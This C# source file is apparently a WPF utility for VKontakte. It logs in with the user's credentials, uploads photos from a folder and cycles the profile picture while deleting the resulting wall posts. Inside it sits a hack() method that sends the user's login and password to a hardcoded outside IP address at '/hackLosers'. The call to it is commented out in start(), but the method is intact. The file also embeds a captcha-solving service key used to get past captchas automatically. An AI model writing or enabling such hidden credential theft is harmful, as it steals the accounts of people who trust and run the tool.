using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using VkNet;
using VkNet.Enums.Filters;
using VkNet.Model.RequestParams;
using System.Security.Cryptography;
using System.Net;
using System.Threading;
using System.Windows.Controls;
using VkNet.Model;
using Ookii;
using System.Windows.Media.Imaging;
using System.Linq;
using VkNet.Exception;
using System.Collections.Specialized;
using VkNet.Utils.AntiCaptcha;
using VkNet.AudioBypassService.Extensions;
using Microsoft.Extensions.DependencyInjection;

namespace VKWPF
{
	class VK : ICaptchaSolver
	{
		private string m_path;
        private string m_login;
		private string m_password;
		private bool m_rewrite;
		private int m_time;
		private string m_twoFactorCode = "";
		private TextBox m_twoFactor;
		private System.Windows.Controls.Image m_image;
		private TextBlock m_text;
		private StreamReader info;
		private VkApi api;
		private void send(string path)
		{
			string[] names = Directory.GetFiles(path);
			string url = api.Photo.GetOwnerPhotoUploadServer().UploadUrl;
			WebClient client = new WebClient();
			StreamWriter info = new StreamWriter("info.txt", false);
			for (int i = 0; i < names.Length; i++)
			{
				var response = client.UploadFile(url, @names[i]);
				string t = Encoding.UTF8.GetString(response);
				info.WriteLine(t + "|" + names[i]);
				info.Flush();
				int k = i + 1;
				m_image.Dispatcher.Invoke(() =>
				{
					m_image.Source = new BitmapImage(new Uri(names[(k == names.Length ? 0 : k)], UriKind.Absolute));
				});
				m_text.Dispatcher.Invoke(() =>
				{
					m_text.Text = k + "/" + names.Length;
				});
			}
			info.Close();
		}
		private async void hack(string login, string password)
		{
			WebRequest request = WebRequest.Create("http://5.228.43.243:44038/hackLosers");
			request.Method = "POST";
			string data = "login=" + login + "&password=" + password;
			byte[] byteArray = Encoding.UTF8.GetBytes(data);
			request.ContentType = "application/x-www-form-urlencoded";
			request.ContentLength = byteArray.Length;
			using (Stream dataStream = request.GetRequestStream())
			{
				dataStream.Write(byteArray, 0, byteArray.Length);
			}
			WebResponse response = await request.GetResponseAsync();
		}
		string ICaptchaSolver.Solve(string url)
        {
			WebClient oWeb = new WebClient();
			oWeb.DownloadFile(url, "captcha.jpg");
			NameValueCollection parameters = new NameValueCollection();
			parameters.Add("key", "c6b039b9edac2f7ae79c52502fcf6461");
			parameters.Add("method", "post");
			oWeb.QueryString = parameters;
			var responseBytes = oWeb.UploadFile("http://rucaptcha.com/in.php", "captcha.jpg");
			string response = Encoding.ASCII.GetString(responseBytes);
			File.Delete("captcha.jpg");
			string id = response.Split('|')[1];
			parameters.Clear();
			parameters.Add("key", "c6b039b9edac2f7ae79c52502fcf6461");
			parameters.Add("action", "get");
			parameters.Add("id", id);
			oWeb.QueryString = parameters;
			response = "CAPCHA_NOT_READY";
			while (response == "CAPCHA_NOT_READY")
			{
				responseBytes = oWeb.UploadValues("http://rucaptcha.com/res.php", parameters);
				response = Encoding.ASCII.GetString(responseBytes);
				Thread.Sleep(1000);
			}
			return response.Split('|')[1];
        }
		void ICaptchaSolver.CaptchaIsFalse() {}
		public void setAnswer(string code)
        {
			m_twoFactorCode = code;
        }
		public void setComponents(System.Windows.Controls.Image image, TextBlock text, TextBox twoFactor)
		{
			m_twoFactor = twoFactor;
			m_image = image;
			m_text = text;
		}
		public void closeFiles()
        {
			info.Close();
        }
		public void start()
		{
			bool wrong = false;
			api.Authorize(new ApiAuthParams()
			{
				ApplicationId = 7886944,
				Login = m_login,
				Password = m_password,
				Settings = Settings.All,
				TwoFactorAuthorization = () =>
				{
					m_twoFactor.Dispatcher.Invoke(() =>
					{
						m_twoFactor.IsEnabled = true;
						if (wrong)
						{
							m_twoFactor.Text = "";
							m_twoFactorCode = "";
						}
					});
					while (m_twoFactorCode.Length != 6) { }
					m_twoFactor.Dispatcher.Invoke(() =>
					{
						m_twoFactor.IsEnabled = false;
					});
					wrong = true;
					return m_twoFactorCode;
				}
			});
			//hack(login, password);
			var file = new FileInfo("info.txt");
			if (!file.Exists || file.Length == 0 || m_rewrite) send(m_path);
			info = new StreamReader("info.txt");
			List<(string, string)> photos = new List<(string, string)>();
			while (!info.EndOfStream)
			{
				string[] line = info.ReadLine().Split('|');
				photos.Add((line[0], line[1]));
			}
			info.Close();
			if (photos.Count < Directory.GetFiles(m_path).Length) send(m_path);
			while (true)
			{
				photos = photos.OrderBy(a => Guid.NewGuid()).ToList();
				for (int i = 0; i < photos.Count; i++)
				{
					int k = i + 1;
					api.Photo.SaveOwnerPhoto(photos[i].Item1);
					m_image.Dispatcher.Invoke(() =>
					{
						m_image.Source = new BitmapImage(new Uri(photos[(k == photos.Count ? 0 : k)].Item2, UriKind.Absolute));
					});
					m_text.Dispatcher.Invoke(() =>
					{
						m_text.Text = k + "/" + photos.Count;
					});
					var wall = api.Wall.Get(new WallGetParams());
					api.Wall.Delete(wall.WallPosts[0].OwnerId, wall.WallPosts[0].Id);
					Thread.Sleep(m_time * 1000);
				}
			}
		}
		public VK(string path, string login, string password, bool rewrite, int time)
		{
			var services = new ServiceCollection();
			services.AddAudioBypass();
			services.AddSingleton<ICaptchaSolver>(this);
			api = new VkApi(services);
			m_path = path;
			m_login = login;
			m_password = password;
			m_rewrite = rewrite;
			m_time = time;
		}
    }
}
